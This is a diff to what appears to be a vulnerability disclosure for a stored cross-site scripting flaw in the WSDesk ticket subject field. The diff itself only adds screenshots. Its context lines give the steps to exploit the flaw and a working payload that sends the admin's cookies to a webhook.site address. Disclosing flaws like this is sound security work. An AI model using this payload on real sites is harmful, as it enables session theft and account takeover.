@@ -37,6 +37,8 @@ An attacker can exploit this flaw by injecting malicious JavaScript code into th
 
 2. In the **Subject** field of the ticket form, insert the following payload:
 "<img src=x onerror="(new Image).src='https://webhook.site/3bdce340-f98e-4d53-9d40-f93c94df619a?c='+encodeURIComponent(document.cookie)">"
+<img width="2309" height="1044" alt="สกรีนช็อต 2025-08-09 222657" src="https://github.com/user-attachments/assets/bc27f241-c842-40a8-a5a2-49fa078f3e82" />
+
 
 3. Submit the ticket.
 
@@ -44,7 +46,13 @@ An attacker can exploit this flaw by injecting malicious JavaScript code into th
 WSDesk → Ticket
 the ticket subject is rendered without proper sanitization.
 
+<img width="2874" height="883" alt="สกรีนช็อต 2025-08-09 222743" src="https://github.com/user-attachments/assets/719712e8-85d7-4729-bebf-6fdaeb2d9b83" />
+
+
 5. The payload executes immediately — even without the admin opening the ticket — sending the admin's cookies to the attacker's webhook.
+
+<img width="2879" height="1187" alt="สกรีนช็อต 2025-08-09 222721" src="https://github.com/user-attachments/assets/cbab152e-5890-44b4-a6f2-85fd72c1ea9e" />
+
 
 ## Impact
 Successful exploitation allows an attacker to:
